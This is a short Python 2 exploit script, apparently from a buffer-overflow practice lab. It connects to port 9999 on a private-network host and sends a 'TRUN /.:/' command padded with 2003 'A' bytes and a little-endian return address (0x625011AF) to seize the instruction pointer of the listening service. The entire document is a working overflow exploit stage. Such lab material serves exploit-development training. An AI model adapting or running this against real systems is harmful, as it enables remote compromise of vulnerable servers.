#!/usr/bin/python
import sys,socket
#625011AF
shellcode = "A" * 2003 + "\xAF\x11\x50\x62"

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.0.2.4',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
